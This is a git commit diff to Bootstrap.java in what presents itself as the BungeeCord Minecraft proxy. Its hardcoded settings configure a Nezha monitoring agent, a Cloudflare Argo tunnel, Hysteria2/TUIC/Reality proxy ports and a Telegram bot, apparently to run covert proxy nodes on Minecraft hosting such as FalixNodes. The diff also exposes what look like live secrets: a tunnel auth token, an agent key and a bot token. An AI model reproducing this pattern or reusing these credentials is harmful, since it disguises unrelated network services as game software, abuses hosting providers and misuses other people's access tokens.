c5334776b26b91fe750bd51235fa35e036f32af8
smgzj <32670138+smgzj@users.noreply.github.com>
2025-10-31 17:51:20 +0800

    Update Bootstrap.java

--- bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
+++ bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
@@ -94,23 +94,23 @@ public class Bootstrap
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "015c9a72-8e76-42c5-8576-07cd5f5268d3");
+        envVars.put("UUID", "e50fb3c3-7314-44f3-95ae-856538332517");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.smgzj.pp.ua");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "Yr5ldnKDfT6mOwDl2X");
+        envVars.put("NEZHA_KEY", "anvPl7FE8g7ZNPznfb");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "mcst1.c.2.f.e.0.7.4.0.1.0.0.2.ip6.arpa");
-        envVars.put("ARGO_AUTH", "eyJhIjoiNWZiZDU1M2IzNjViZWE3YWRlYjNmYzIyMjM4NGNlMzMiLCJ0IjoiNDQyNGRjZDktMTE0Yy00YjZkLWE5MzAtMjcxODllMWQxODFjIiwicyI6IlpEWTNORFEzTkRrdFlUUTVNeTAwWldRMkxXRXdaall0WlRZek9XRTVPVEF4WXprdyJ9");
-        envVars.put("HY2_PORT", "8002");
-        envVars.put("TUIC_PORT", "8003");
-        envVars.put("REALITY_PORT", "8004");
+        envVars.put("ARGO_DOMAIN", "falix.c.2.f.e.0.7.4.0.1.0.0.2.ip6.arpa");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNWZiZDU1M2IzNjViZWE3YWRlYjNmYzIyMjM4NGNlMzMiLCJ0IjoiNjM1NDU2NWEtYmEzMS00M2Y2LTlkYmItZTRkMzYwNzYyYTI2IiwicyI6Ik1qTmpNbU13TTJVdFlUazJOaTAwWm1Fd0xXRTBZamt0WlRRelltWXdOemt5TWpZNSJ9");
+        envVars.put("HY2_PORT", "");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("REALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "545623503");
         envVars.put("BOT_TOKEN", "7942352997:AAHaDot3lbRqeNLJv57kQ31NG-cGt0Fhb1Y");
         envVars.put("CFIP", "store.ubi.com");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "MCST");
+        envVars.put("NAME", "falixnodes");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
